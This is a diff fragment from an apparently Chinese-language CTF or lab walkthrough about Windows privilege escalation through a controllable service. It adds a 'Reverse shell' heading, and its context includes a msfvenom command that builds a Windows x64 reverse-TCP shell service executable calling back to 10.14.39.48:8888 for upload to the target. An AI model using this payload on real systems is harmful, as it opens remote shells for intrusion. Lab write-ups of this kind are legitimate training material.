@@ -190,6 +190,8 @@ user.txt在桌面下
 
 我们可以控制该服务启动或停止
 
+## Reverse shell
+
 msfvenom生成reverse shell并上传到目标
 
     msfvenom -p windows/x64/shell_reverse_tcp lhost=10.14.39.48 lport=8888 -f exe-service > she11.exe
